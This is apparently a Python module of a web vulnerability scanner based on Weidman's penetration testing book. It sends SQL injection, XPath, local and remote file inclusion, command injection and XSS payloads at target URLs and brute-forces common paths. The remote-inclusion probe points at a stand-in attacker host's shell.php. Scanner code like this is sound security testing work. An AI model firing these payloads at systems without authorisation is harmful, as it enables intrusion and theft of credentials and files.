"""Weidman book-inspired web application tests (Ch.14).

Techniques from *Penetration Testing: A Hands-On Introduction to Hacking*:
SQL injection, XPath injection, LFI/RFI, command injection, XSS, CSRF,
blind SQLi, and directory brute-forcing.
"""

from __future__ import annotations

import asyncio
import re
import time
from urllib.parse import parse_qs, urlencode, urljoin, urlparse, urlunparse

import httpx

from core.config import FORBIDDEN_PATHS, HTTP_TIMEOUT, REQUEST_DELAY, USER_AGENT
from core.content_validator import is_html_response, validate_path_traversal, validate_sensitive_path

EVIL = "https://evil-attacker-security-test.example.com"
PROBE = "weidmanProbe881"

# Ch.14 — SQL injection payloads (Weidman bookdetail.aspx technique)
_SQLI_SINGLE = "'"
_SQLI_AUTH_BYPASS = ["' OR '1'='1", "' OR '1'='1'--", "admin'--", "1' OR '1'='1"]
_SQLI_ERROR_SIGS = (
    "sql syntax", "mysql", "postgresql", "ora-", "sqlite", "odbc",
    "unclosed quotation", "quoted string not properly terminated",
    "microsoft ole db", "mssql", "sybase", "syntax error",
    "warning: mysql", "valid mysql result", "pg_query",
)
_SQLI_BLIND_TRUE = "1' AND '1'='1"
_SQLI_BLIND_FALSE = "1' AND '1'='2"
_SQLI_MSSQL = [
    "2 or 1 in (SELECT DB_NAME(0))--",
    "1'; WAITFOR DELAY '0:0:3'--",
    "1' AND 1=CONVERT(int,@@version)--",
]

# Ch.14 — XPath injection (login bypass)
_XPATH_PAYLOADS = ["' or '1'='1", "' or 1=1 or '", "1' or '1'='1"]
_XPATH_ERR = ("xpath", "xmlparse", "simplexmlelement", "domxpath", "xml", "expression")

# Ch.14 — LFI (absolute Windows paths + Linux)
_LFI_PATHS = [
    "../../../etc/passwd",
    "....//....//etc/passwd",
    "C:\\inetpub\\wwwroot\\web.config",
    "C:\\inetpub\\wwwroot\\Book\\AuthInfo.xml",
    "/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "..\\..\\..\\windows\\win.ini",
    "/proc/self/environ",
]

# Ch.14 — RFI probe
_RFI_PAYLOADS = [
    f"http://{EVIL.split('//')[1]}/probe.txt",
    f"https://{EVIL.split('//')[1]}/shell.php",
]

# Ch.14 — Command injection (newsletter & technique)
_CMDI_PAYLOADS = [
    ";id", "|id", "& ipconfig", "& whoami", "`id`", "$(id)",
    "georgia@bulbsecurity.com & whoami",
    "| ping -c 1 127.0.0.1",
]

# Ch.14 — XSS (reflected search box technique)
_XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    f"<script>alert('{PROBE}')</script>",
    '"><img src=x onerror=alert(1)>',
    "<svg/onload=alert(1)>",
]

# Ch.14 — Directory brute (Nikto/w3af style common paths)
_DIR_WORDLIST = [
    "/admin", "/login", "/administrator", "/backup", "/config",
    "/db", "/database", "/test", "/dev", "/staging", "/api",
    "/phpmyadmin", "/phpinfo.php", "/server-status", "/.git/HEAD",
    "/web.config", "/crossdomain.xml", "/bookservice", "/uploads",
    "/newsletter", "/profile", "/search.aspx", "/bookdetail.aspx",
    "/AuthInfo.xml", "/wp-login.php", "/xmlrpc.php",
]

_LOGIN_PARAMS = ("txtUser", "txtPass", "username", "password", "user", "pass", "email")


class WeidmanEngine:
    """Book-inspired web application vulnerability hunter."""

    def __init__(self):
        self.findings: list[dict] = []
        self.stats = {"techniques": 0, "checks": 0, "hits": 0}

    def _add(self, **kw) -> None:
        self.stats["hits"] += 1
        self.findings.append({
            "id": kw.get("id", f"weidman-{abs(hash(kw.get('target', ''))) % 10**9}"),
            "target": kw["target"],
            "title": kw["title"],
            "severity": kw.get("severity", "medium"),
            "category": kw.get("category", "Web Application"),
            "description": kw.get("description", ""),
            "evidence": (kw.get("evidence") or "")[:400],
            "remediation": kw.get("remediation", "Sanitize all user input per OWASP."),
            "exploitable": kw.get("exploitable", False),
            "detection_source": "weidman_engine",
            "technique": kw.get("technique", "web_app"),
            "confidence": kw.get("confidence", 60),
        })

    async def run_all(self, urls: list[str], pages: list[dict] | None = None) -> list[dict]:
        self.findings = []
        self.stats = {"techniques": 0, "checks": 0, "hits": 0}
        targets = list(dict.fromkeys(urls[:15]))
        pages = pages or []

        async with httpx.AsyncClient(
            timeout=HTTP_TIMEOUT,
            follow_redirects=True,
            headers={"User-Agent": USER_AGENT},
        ) as client:
            for url in targets:
                self.stats["techniques"] += 1
                await asyncio.gather(
                    self._sqli_tests(client, url),
                    self._xpath_login(client, url),
                    self._lfi_tests(client, url),
                    self._rfi_tests(client, url),
                    self._cmdi_tests(client, url),
                    self._xss_reflected(client, url),
                    self._csrf_check(client, url),
                    self._directory_brute(client, url),
                    return_exceptions=True,
                )
                await asyncio.sleep(REQUEST_DELAY)

            # Test discovered forms from crawled pages
            for page in pages[:15]:
                await self._test_page_forms(client, page)

        return self.findings

    async def _sqli_tests(self, client: httpx.AsyncClient, url: str) -> None:
        parsed = urlparse(url)
        params = list(parse_qs(parsed.query).keys()) or ["id", "q", "search", "page", "cat"]

        for param in params[:8]:
            # Ch.14 — single quote error detection
            test = urlunparse(parsed._replace(query=urlencode({param: _SQLI_SINGLE})))
            self.stats["checks"] += 1
            try:
                r = await client.get(test)
                body_low = r.text.lower()
                if any(sig in body_low for sig in _SQLI_ERROR_SIGS):
                    self._add(
                        id=f"sqli-err-{hash(test) % 10**8}",
                        target=test,
                        title=f"SQL Injection Error via '{param}' (Ch.14)",
                        severity="high", category="SQL Injection",
                        technique="sqli_error",
                        evidence=r.text[:200],
                        exploitable=True, confidence=90,
                        description="Single-quote probe triggered SQL error (Weidman Ch.14).",
                    )
                    continue
            except Exception:
                pass

            # Auth bypass payloads
            for payload in _SQLI_AUTH_BYPASS[:2]:
                test = urlunparse(parsed._replace(query=urlencode({param: payload})))
                self.stats["checks"] += 1
                try:
                    r = await client.get(test)
                    if r.status_code == 200 and len(r.text) > 500:
                        if any(k in r.text.lower() for k in ("welcome", "dashboard", "logout", "admin")):
                            self._add(
                                id=f"sqli-bypass-{hash(test) % 10**8}",
                                target=test,
                                title=f"Possible SQL Auth Bypass via {param}",
                                severity="critical", category="SQL Injection",
                                technique="sqli_auth_bypass",
                                evidence=f"Payload: {payload}",
                                exploitable=True, confidence=75,
                            )
                except Exception:
                    pass

            # MS SQL extraction (Ch.14 DB_NAME technique)
            for payload in _SQLI_MSSQL[:1]:
                test = urlunparse(parsed._replace(query=urlencode({param: payload})))
                self.stats["checks"] += 1
                try:
                    r = await client.get(test)
                    if "conversion failed" in r.text.lower() or "nvarchar" in r.text.lower():
                        self._add(
                            id=f"sqli-mssql-{hash(test) % 10**8}",
                            target=test,
                            title="MS SQL Injection — Database Name Disclosure",
                            severity="critical", category="SQL Injection",
                            technique="sqli_mssql_dbname",
                            evidence=r.text[:200],
                            exploitable=True, confidence=92,
                            description="DB_NAME() injection per Weidman Ch.14 Listing 14-1.",
                        )
                except Exception:
                    pass

            # Blind SQLi — response differential
            self.stats["checks"] += 1
            try:
                true_url = urlunparse(parsed._replace(query=urlencode({param: _SQLI_BLIND_TRUE})))
                false_url = urlunparse(parsed._replace(query=urlencode({param: _SQLI_BLIND_FALSE})))
                r_true, r_false = await asyncio.gather(client.get(true_url), client.get(false_url))
                if abs(len(r_true.text) - len(r_false.text)) > 200:
                    self._add(
                        id=f"sqli-blind-{hash(url + param) % 10**8}",
                        target=url,
                        title=f"Possible Blind SQL Injection via {param}",
                        severity="high", category="SQL Injection",
                        technique="sqli_blind",
                        evidence=f"Response diff: {len(r_true.text)} vs {len(r_false.text)} bytes",
                        exploitable=False, confidence=55,
                        description="Blind SQLi differential (Ch.14 note on blind injection).",
                    )
            except Exception:
                pass

    async def _xpath_login(self, client: httpx.AsyncClient, base: str) -> None:
        login_paths = ["/login", "/signin", "/auth/login", "/bookservice/login.aspx"]
        for path in login_paths:
            login_url = urljoin(base, path)
            for payload in _XPATH_PAYLOADS:
                self.stats["checks"] += 1
                try:
                    data = {p: payload for p in _LOGIN_PARAMS[:2]}
                    r = await client.post(login_url, data=data)
                    body_low = r.text.lower()
                    if any(e in body_low for e in _XPATH_ERR):
                        self._add(
                            id=f"xpath-{hash(login_url + payload) % 10**8}",
                            target=login_url,
                            title="XPath Injection at Login (Ch.14)",
                            severity="high", category="XPath Injection",
                            technique="xpath_injection",
                            evidence=r.text[:200],
                            exploitable=True, confidence=88,
                            description="' or '1'='1 login bypass per Weidman Ch.14.",
                        )
                        return
                    if r.status_code in (200, 302) and any(
                        k in body_low for k in ("welcome", "dashboard", "logout", "profile")
                    ):
                        self._add(
                            id=f"xpath-bypass-{hash(login_url) % 10**8}",
                            target=login_url,
                            title="Possible XPath Auth Bypass",
                            severity="critical", category="XPath Injection",
                            technique="xpath_auth_bypass",
                            evidence=f"Payload: {payload}",
                            exploitable=True, confidence=70,
                        )
                        return
                except Exception:
                    pass

    async def _lfi_tests(self, client: httpx.AsyncClient, url: str) -> None:
        parsed = urlparse(url)
        file_params = ("file", "path", "page", "include", "doc", "template", "filename", "c")

        for param in file_params:
            for lfi_path in _LFI_PATHS[:5]:
                test = urlunparse(parsed._replace(query=urlencode({param: lfi_path})))
                if any(p in test for p in FORBIDDEN_PATHS):
                    continue
                self.stats["checks"] += 1
                try:
                    r = await client.get(test)
                    ct = r.headers.get("content-type", "")
                    vr = validate_path_traversal(r.text, ct)
                    if vr.valid:
                        self._add(
                            id=f"lfi-{hash(test) % 10**8}",
                            target=test,
                            title=f"Local File Inclusion via {param} (Ch.14)",
                            severity="critical", category="LFI",
                            technique="lfi",
                            evidence=vr.reason,
                            exploitable=True, confidence=92,
                            description="LFI reads local filesystem (Weidman newsletter technique).",
                        )
                        return
                    if "web.config" in lfi_path.lower() and "<?xml" in r.text:
                        self._add(
                            id=f"lfi-config-{hash(test) % 10**8}",
                            target=test,
                            title="Web.config Exposed via LFI",
                            severity="critical", category="LFI",
                            technique="lfi_webconfig",
                            evidence=r.text[:200],
                            exploitable=True, confidence=90,
                        )
                        return
                except Exception:
                    pass

    async def _rfi_tests(self, client: httpx.AsyncClient, url: str) -> None:
        parsed = urlparse(url)
        for param in ("file", "page", "include", "path", "url", "src"):
            for payload in _RFI_PAYLOADS[:1]:
                test = urlunparse(parsed._replace(query=urlencode({param: payload})))
                self.stats["checks"] += 1
                try:
                    r = await client.get(test)
                    if EVIL.split("//")[1] in r.text or "probe" in r.text.lower():
                        self._add(
                            id=f"rfi-{hash(test) % 10**8}",
                            target=test,
                            title=f"Remote File Inclusion via {param} (Ch.14)",
                            severity="critical", category="RFI",
                            technique="rfi",
                            evidence=f"Remote content fetched: {payload[:80]}",
                            exploitable=True, confidence=85,
                            description="RFI allows remote script execution (Ch.14 PHP include).",
                        )
                        return
                except Exception:
                    pass

    async def _cmdi_tests(self, client: httpx.AsyncClient, url: str) -> None:
        parsed = urlparse(url)
        cmd_params = ("email", "cmd", "exec", "command", "host", "ping", "ip", "name")

        for param in cmd_params:
            for payload in _CMDI_PAYLOADS[:3]:
                test = urlunparse(parsed._replace(query=urlencode({param: payload})))
                self.stats["checks"] += 1
                try:
                    r = await client.get(test)
                    body = r.text.lower()
                    if any(sig in body for sig in ("uid=", "gid=", "www-data", "nt authority", "ipconfig")):
                        self._add(
                            id=f"cmdi-{hash(test) % 10**8}",
                            target=test,
                            title=f"Command Injection via {param} (Ch.14 & technique)",
                            severity="critical", category="Command Injection",
                            technique="cmdi",
                            evidence=r.text[:200],
                            exploitable=True, confidence=90,
                            description="OS command output in response (newsletter signup Ch.14).",
                        )
                        return
                except Exception:
                    pass

    async def _xss_reflected(self, client: httpx.AsyncClient, url: str) -> None:
        parsed = urlparse(url)
        search_params = ("q", "search", "s", "query", "term", "keyword", "id", "name")

        for param in search_params:
            for payload in _XSS_PAYLOADS[:2]:
                test = urlunparse(parsed._replace(query=urlencode({param: payload})))
                self.stats["checks"] += 1
                try:
                    r = await client.get(test)
                    if payload in r.text or PROBE in r.text:
                        self._add(
                            id=f"xss-{hash(test) % 10**8}",
                            target=test,
                            title=f"Reflected XSS via {param} (Ch.14)",
                            severity="high", category="XSS",
                            technique="xss_reflected",
                            evidence=f"Payload reflected: {payload[:60]}",
                            exploitable=True, confidence=88,
                            description="Search box XSS per Weidman book search technique.",
                        )
                        return
                except Exception:
                    pass

    async def _csrf_check(self, client: httpx.AsyncClient, url: str) -> None:
        self.stats["checks"] += 1
        try:
            r = await client.get(url)
            forms = re.findall(r"<form[^>]*>.*?</form>", r.text, re.I | re.S)
            for form in forms[:5]:
                if re.search(r'type=["\']password', form, re.I):
                    method = "post" if re.search(r'method=["\']post', form, re.I) else "get"
                    has_token = bool(re.search(
                        r'csrf|authenticity_token|_token|nonce|__requestverificationtoken',
                        form, re.I,
                    ))
                    if method == "post" and not has_token:
                        self._add(
                            id=f"csrf-{hash(url) % 10**8}",
                            target=url,
                            title="Login Form Missing CSRF Token (Ch.14)",
                            severity="medium", category="CSRF",
                            technique="csrf_missing",
                            evidence="POST password form without anti-CSRF token.",
                            description="CSRF risk per Weidman Ch.14 banking scenario.",
                        )
                        return
        except Exception:
            pass

    async def _directory_brute(self, client: httpx.AsyncClient, base: str) -> None:
        for path in _DIR_WORDLIST[:20]:
            if path in FORBIDDEN_PATHS:
                continue
            test = urljoin(base, path)
            self.stats["checks"] += 1
            try:
                r = await client.get(test)
                if r.status_code == 200 and len(r.text) > 50:
                    ct = r.headers.get("content-type", "")
                    if path.endswith((".xml", ".config", ".env", ".sql")):
                        vr = validate_sensitive_path(path, r.text, ct)
                        if vr.valid:
                            self._add(
                                id=f"dir-{hash(test) % 10**8}",
                                target=test,
                                title=f"Sensitive File Accessible: {path}",
                                severity="high", category="Information Disclosure",
                                technique="directory_brute",
                                evidence=vr.reason,
                                exploitable=True, confidence=85,
                            )
                    elif not is_html_response(r.text, ct) or path in ("/.git/HEAD",):
                        self._add(
                            id=f"dir-{hash(test) % 10**8}",
                            target=test,
                            title=f"Hidden Path Discovered: {path}",
                            severity="info", category="Attack Surface",
                            technique="directory_brute",
                            evidence=f"HTTP 200 ({len(r.text)} bytes)",
                        )
            except Exception:
                pass

    async def _test_page_forms(self, client: httpx.AsyncClient, page: dict) -> None:
        url = page.get("url", "")
        if not url:
            return
        try:
            from pathlib import Path
            html = Path(page.get("source_path", "")).read_text(encoding="utf-8", errors="replace")
        except Exception:
            return

        action_match = re.search(r'<form[^>]+action=["\']([^"\']*)["\']', html, re.I)
        if not action_match:
            return
        action = urljoin(url, action_match.group(1))
        inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', html, re.I)
        if not inputs:
            return

        for payload in _XSS_PAYLOADS[:1]:
            data = {inp: payload for inp in inputs[:4]}
            self.stats["checks"] += 1
            try:
                r = await client.post(action, data=data)
                if payload in r.text:
                    self._add(
                        id=f"xss-form-{hash(action) % 10**8}",
                        target=action,
                        title="Stored/Reflected XSS in Form",
                        severity="high", category="XSS",
                        technique="xss_form",
                        evidence=f"Form fields: {', '.join(inputs[:4])}",
                        exploitable=True, confidence=80,
                    )
            except Exception:
                pass
